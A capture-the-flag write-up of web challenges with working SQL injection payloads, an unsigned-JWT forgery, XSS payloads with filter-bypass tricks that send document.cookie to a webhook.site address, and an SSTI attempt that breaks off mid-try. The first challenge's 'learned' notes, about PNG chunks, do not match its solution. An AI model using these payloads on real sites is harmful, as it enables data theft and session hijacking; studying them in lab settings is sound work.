# Web exploitation
## Challenge 1: Oneshot
> Directly access the challenge server at https://pacman-git-master-mrrobot404s-projects.vercel.app

### Solution

- I opened the website which opens to a page asking me to create a new session and asking me to search for scattered fragments. I simply press search which gives me `4*******************************` and asks me to guess (not able to make the guess as of now ofc)
- We are also given a src which has a python code. It tells us
- i view the page source of the query page and get the ID of the table being used (![oneshot1](https://github.com/user-attachments/assets/6e54a8e0-cd95-43d2-91e6-39476208207b)
)
- From this i generate a UNION SQL table injection for every character of the 32-bit password
```  %' UNION ALL SELECT substr(password,1,1) FROM table_3f36589f1aae04ec 
UNION ALL SELECT substr(password,2,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,3,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,4,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,5,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,6,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,7,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,8,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,9,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,10,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,11,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,12,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,13,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,14,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,15,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,16,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,17,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,18,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,19,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,20,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,21,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,22,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,23,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,24,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,25,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,26,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,27,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,28,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,29,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,30,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,31,1) FROM table_3f36589f1aae04ec
UNION ALL SELECT substr(password,32,1) FROM table_3f36589f1aae04ec --
```

- This gives me the password (ignore the first line since we only need 32 bits, the first line merely tells us what the password is going to start with)


**Flag:** `nite{are_you_feeling_the_heat_now :)}`

### What I learned
- PNG is short for portable network graphics (unrelated but who knew that!?) 
- chunks are basically blocks of data used to store information about the PNG file
- CRC- cyclic redundancy code- ensures data integrity


### References
- https://medium.com/@0xwan/png-structure-for-beginner-8363ce2a9f73 


## Challenge 2: Temporal Token
> I made my own website with custom auth, but why can't i login with my credentials?

```
Username: Belegar
Password: Ironhammer
```

Directly access the challenge server at https://temporal-token.nitephase.live
### Solution

- I open the website and it asks for username and password (![temporal1](https://github.com/user-attachments/assets/09ef33fb-b76c-44f4-81df-675c54be7cb5)
)
- when i press login, without entering anything the response chnages to 
```
 {
  "status": 400,
  "body": {
    "error": "username and password required"
  },
  "afterCheck": {
    "status": 401,
    "body": {
      "error": "Missing token cookie"
    }
  }
 }
```
- When i enter the given username and password, the response changes to 
``` {
  "status": 200,
  "body": {
    "success": true
  },
  "afterCheck": {
    "status": 401,
    "body": {
      "error": "Token expired"
    }
  }
}
```
if i enter anyother username, the status gives 401 error saying `Invalid credentials` 
This shows us that the response is basically telling us what goes on in the internal code of the website

- I look at the cookies now. and there is a cookie called token. I cpy paste it into jwt.io to decode it.
 we get 
 ```{
  "alg": "HS256",
  "typ": "JWT"
}
```
```{
  "sub": "Belegar",
  "exp": 0
}
```
It shows that the cookie expired on january first, 1970. So we need to change that.

- i used https://kjur.github.io/jsrsasign/tool/tool_jwt.html to generate the new token where i put subject as Belegar, expiration as 1767225599 (unix time stamp for 32st dec 2025 but any future day will do), type as JWT. i left the signature empty because it wasnt shown while decoding the initial token and then encoded a new token.
- ![temporal2](https://github.com/user-attachments/assets/5afdc001-cd37-4471-aa95-fa953d097aca)
 I took this new generated token to put in the cache token. This gave me the flag.

**Flag:** `nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}`


### What I learned
- how to generate tokens (and how to know what is wrong with the current given token)

### References 
- https://kjur.github.io/jsrsasign/tool/tool_jwt.html
- jwt.io 

## Challenge 3: DATABASE INCURSION 2.0

> Directly access the challenge server at https://database-incursion-v2.nitephase.live/
### Solution

- The website is asking for username and password (both of which i do not have) so i decide to apply SQLi. I put the most common injection first which is `'OR 1=1 --` and a ramndom password.(![database1](https://github.com/user-attachments/assets/9b349e02-c36a-4269-ade3-2168aa380476)
)
- It tells me the someone from management has the passcode. So now i need to search for this person.I put `' OR department='Management'--` which gave me the person. (![database2](https://github.com/user-attachments/assets/72a92d7c-8ba5-47ec-a0e7-1e219cec6c4d)
)
- So now i know kiwi has my answer. `' OR (name LIKE '%kiwi%' AND department LIKE '%manag%')--` gave me the passcode as `Passcode: ecSKsN7SES`. Entering this passcode, i got access to the admin panel. 
- I can see that the last row of the metadata registry is redacted (which is interesting) so i go to that. 
- using `' UNION SELECT name, type, sql, 0 FROM sqlite_master-- ` i got a lead ![database3](https://github.com/user-attachments/assets/594eddf9-6efc-45e5-a0c5-f2e22a4f231e)
  I know that CITADEL_ARCHIVE_2077 has the secret. 
- So i do `' UNION SELECT secrets, null, null, null FROM CITADEL_ARCHIVE_2077 --` and i get the flag

**Flag:** `CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}`
`

### What I learned
- I learnt different SQL payloads and how they can be used to do different things.

### References
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md 
## Challenge 4: Why is is not called CSS?
 > The website will be accessible at http://localhost:56743 After solving locally, access the challenge server at http://whyisitnotcalledcss.nitephase.live:56743

### Solution

- On entering the site we get. on typing anything in the input box we get ![css1](https://github.com/user-attachments/assets/7091e69a-478f-4189-b5cb-4803124ae934)

- The name suggests xss scripting is to be used to get the answers. We need to steal its cookies (as per what it says). So i go to inspect it and i see the script
```

    function updateUrl() {
        document.getElementById("url").textContent = "Bot will visit " + location.protocol + '//' + location.host + location.pathname + "?payload=" + encodeURIComponent(document.getElementById("payload").value);
    }

    async function sendLink() {
        await fetch(location.protocol + '//' + location.host + location.pathname, {
            method: "POST",
            body: "payload="+encodeURIComponent(document.getElementById("payload").value),
            headers: 
                {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
        }).then((response) => response.text())
        .then(text => {
            document.getElementById("url").innerText = text;
        });
    }
```
I dont understand this
- I do some research and find a website called webhook. (![css2](https://github.com/user-attachments/assets/a252514c-6260-4d9b-94a5-72e35fdc2945)
)
from this is get a query string `xss2=/bf2a73106a3aa48bab9b8b47e4bd350e`. I concatenate this to the url to get the next XSS ME ![css3](https://github.com/user-attachments/assets/bd25f194-f6d9-49d8-9095-e5c66e050847)

Here a new filter is added. In this `script`, `img` and `svg` is removed. So we get creative and use `scscriptript`
```
<scscriptript>
window.location.href="https://webhook.site/36534930-9d1a-4a0d-8f9b-483c821fb400?c=" + 
document.cookie
</scscriptript>
```
- This gives us the new xss query string `xss3=/3e79c8a64bd10f5fa897b7832384f043` which again, concatenate and get new XSS Me ![css4](https://github.com/user-attachments/assets/1606e24d-2dec-4a1c-9e31-4281c0dd68af)

New filters added. now `://`, `cookie`, `document` also cannot be used. So again i need to search of equivalent ways.
```
<scscriptript>
window.location.href="https:/\/webhook.site/36534930-9d1a-4a0d-8f9b-483c821fb400?c=" + dimgocument.cimgookie
</scscriptript>
```
Here `//` can be replaced with `/\/` and other words like `img` can be written between the forbidden words like `cookie`, thus bypassing the filters.
- Thus i finally get the flag ![css5](https://github.com/user-attachments/assets/0f80ca86-aeb4-403c-b12c-64d7da2ebb02)



**Flag:** `nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}`


### What I learned
- I learnt the important of webhook in solving this challenge. It creates temporary URLS which can help us.
- XSS == cross scripting 
- I also learnt various ways of writing the same payloads, so that they mean the same thing, but also bypass the filters

 ## Challenge 5: Sweet Haven
 > To build and start.

First `cd` into the `src` directory. Then run:

```bash
docker-compose up --build -d
```

The website will be accessible at http://localhost:1234

After solving locally, access the challenge server at http://sweethaven.nitephase.live:57889

### Solution:

- I first open the website where i am asked a username and password. I also look at the given python code and source code and static code.
- The phython code first: We have been given the working of the website. the user can register and then submit a review. The code also reveeals filter checks.
```
  if re.search(r"(\\[xu0-9]|\$|'|APOSTROPHE)", review, re.IGNORECASE):
    review = "Best coffee I had"
```
  meaning if x or u or Backslash + digits or $ or ' The literal word APOSTROPHE. If any of these appear, it REPLACES the whole review with "Best coffee I had". This means the challenge expects you to bypass this filter.
  If it passes the filter, Then it does:
```
review = bytes(review, "utf-8").decode("unicode_escape")
```
It will interpret things like \N{…}, It will convert escaping sequences and It allows injecting characters normally filtered out. This gives potential filter bypass. We need to use SSTI.
- I try to give different payloads, keeping in mind the filters. I am basically trying to see the classes of the Docker. first i put `\N{DOLLAR SIGN}{ ''.__class__.__mro__[2].__subclasses__() }` Which prints `Best coffee I ever had`. This means the the `\N` is giving some sort of a problem so i switch to `%5CN`
- I input `%5CN{DOLLAR SIGN}{ ''.__class__.__mro__[2].__subclasses__() }` which again prints `Best coffee I ever had` and i realise that i am still using apostrophes so that is the problem. so i do it without apostrophe `%5CN{DOLLAR SIGN}{().__class__.__mro__[2].__subclasses__()}`.....which also did not work. in fact it kind of crashed and gave me this instead <img width="828" height="497" alt="image" src="https://github.com/user-attachments/assets/9cf4b597-dd13-4d92-b800-0bcc5a11d5b0" />

